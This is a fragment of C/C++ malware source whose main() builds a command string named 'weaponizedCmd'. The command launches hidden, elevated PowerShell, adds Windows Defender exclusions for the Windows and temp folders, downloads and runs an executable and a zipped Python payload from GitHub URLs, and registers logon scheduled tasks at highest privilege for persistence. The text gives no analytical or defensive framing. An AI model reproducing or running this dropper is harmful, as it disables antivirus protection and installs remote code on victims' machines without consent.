...
int main() {
    ...
    swprintf_s(weaponizedCmd, 4086, 
        L"powershell -WindowStyle Hidden -Command \"Start-Process powershell -WindowStyle Hidden -Verb RunAs -ArgumentList '-ExecutionPolicy Bypass -Command \\\"Add-MpPreference -ExclusionProcess \\\\\\\"pdf.exe\\\\\\\";Add-MpPreference -ExclusionPath \\\\\\\"C:\\\\Windows\\\\temp\\\\pdf.exe\\\\\\\"; Add-MpPreference -ExclusionPath \\\\\\\"C:\\\\Windows\\\\temp\\\\\\\";Add-MpPreference -ExclusionPath \\\\\\\"C:\\\\Windows\\\\\\\";[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $exPath=\\\\\\\"C:\\\\Windows\\\\temp\\\\pdf.exe\\\\\\\"; $zipPath=\\\\\\\"$env:USERPROFILE\\\\AppData\\\\Roaming\\\\Word.zip\\\\\\\"; $extractPath=\\\\\\\"$env:USERPROFILE\\\\AppData\\\\Roaming\\\\Word\\\\\\\"; (New-Object System.Net.WebClient).DownloadFile(\\\\\\\"https://github.com/tkankkoa-ai/ok/raw/refs/heads/main/Client.exe\\\\\\\", $exPath); Start-Process \\\\\\\"$exPath\\\\\\\" -WindowStyle Hidden; schtasks /create /tn \\\\\\\"ActivePDF\\\\\\\" /tr \\\\\\\"exPath\\\\\\\" /sc onlogon /delay 0001:00 /rl highest /f; (New-Object System.Net.WebClient).DownloadFile(\\\\\\\"https://github.com/tkankkoa-ai/ok/releases/download/run/office.zip\\\\\\\", $zipPath); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath); Remove-Item $zipPath -Force; Start-Process \\\\\\\"$extractPath\\\\python.exe\\\\\\\" -ArgumentList \\\\\\\"$extractPath\\\\Lib\\\\system.py\\\\\\\" -WindowStyle Hidden; schtasks /create /tn \\\\\\\"ActiveOffice\\\\\\\" /tr \\\\\\\"\\\\\\\"$extractPath\\\\pythonw.exe\\\\\\\" \\\\\\\"$extractPath\\\\Lib\\\\system.py\\\\\\\"\\\\\\\" /sc onlogon /delay 0001:00 /rl highest /f\\\"'\"");
